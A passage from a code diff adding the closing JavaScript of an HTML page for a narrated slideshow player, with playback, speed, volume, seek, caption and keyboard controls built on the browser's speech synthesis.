+        function upd2() { const e = getEl2(), p = Math.min((e / totD2) * 100, 100); pf3.style.width = p + '%'; td2.textContent = fmt2(e) + ' / ' + fmt2(totD2) }
+
+        pl3.addEventListener('click', togP); pv2.addEventListener('click', prv2); nx2.addEventListener('click', nxt2);
+        ss3.addEventListener('change', () => { st2.spd = parseFloat(ss3.value); if (st2.play) { st2.ss = Date.now() - (st2.se * 1000); spk(D[st2.cur].n) } toast2('Speed: ' + ss3.value + 'x') });
+        vs3.addEventListener('input', () => { st2.vol = parseFloat(vs3.value); st2.mut = false; vi2.className = st2.vol === 0 ? 'fas fa-volume-xmark' : st2.vol < .5 ? 'fas fa-volume-low' : 'fas fa-volume-high'; if (st2.utt) st2.utt.volume = st2.vol });
+        vb2.addEventListener('click', () => { st2.mut = !st2.mut; vi2.className = st2.mut ? 'fas fa-volume-xmark' : 'fas fa-volume-high'; if (st2.utt) st2.utt.volume = st2.mut ? 0 : st2.vol });
+        ct2.addEventListener('click', () => { cp2.classList.toggle('op'); ct2.classList.toggle('on') });
+        pw4.addEventListener('click', e => { const r = pw4.getBoundingClientRect(), p = (e.clientX - r.left) / r.width, tt = p * totD2; let a = 0; for (let i = 0; i < D.length; i++) { if (a + D[i].dur >= tt) { seek2(i); const w = tt - a; st2.se = w; st2.ss = Date.now() - (w * 1000); upd2(); break } a += D[i].dur } });
+        sbt2.addEventListener('click', () => { st2.start = true; io3.classList.add('hid'); if (speechSynthesis.getVoices().length === 0) { speechSynthesis.addEventListener('voiceschanged', () => doP(), { once: true }) } else doP() });
+        rbt2.addEventListener('click', () => { eo3.classList.remove('vis'); st2.cur = 0; st2.se = 0; render2(0, 'prev'); upd2(); setTimeout(() => doP(), 300) });
+
+        document.addEventListener('keydown', e => {
+            if (e.target.tagName === 'INPUT' || e.target.tagName === 'SELECT') return;
+            switch (e.code) {
+                case 'Space': e.preventDefault(); if (!st2.start) { sbt2.click(); return } togP(); break;
+                case 'ArrowRight': e.preventDefault(); nxt2(); break;
+                case 'ArrowLeft': e.preventDefault(); prv2(); break;
+                case 'ArrowUp': e.preventDefault(); st2.spd = Math.min(st2.spd + .25, 2); ss3.value = st2.spd.toString(); if (st2.play) { st2.ss = Date.now() - (st2.se * 1000); spk(D[st2.cur].n) } toast2('Speed: ' + st2.spd + 'x'); break;
+                case 'ArrowDown': e.preventDefault(); st2.spd = Math.max(st2.spd - .25, .5); ss3.value = st2.spd.toString(); if (st2.play) { st2.ss = Date.now() - (st2.se * 1000); spk(D[st2.cur].n) } toast2('Speed: ' + st2.spd + 'x'); break;
+                case 'KeyM': vb2.click(); break;
+                case 'KeyF': if (document.fullscreenElement) document.exitFullscreen(); else $('pl2').requestFullscreen?.(); break;
+                case 'Escape': cp2.classList.remove('op'); ct2.classList.remove('on'); break;
+            }
+        });
+        document.addEventListener('visibilitychange', () => { if (document.hidden && st2.play) doPa() });
+        if ('speechSynthesis' in window) { speechSynthesis.getVoices(); speechSynthesis.addEventListener('voiceschanged', () => speechSynthesis.getVoices(), { once: true }) }
+
+        buildS(); buildC(); upd2();
+    </script>
+</body>
+
+</html>
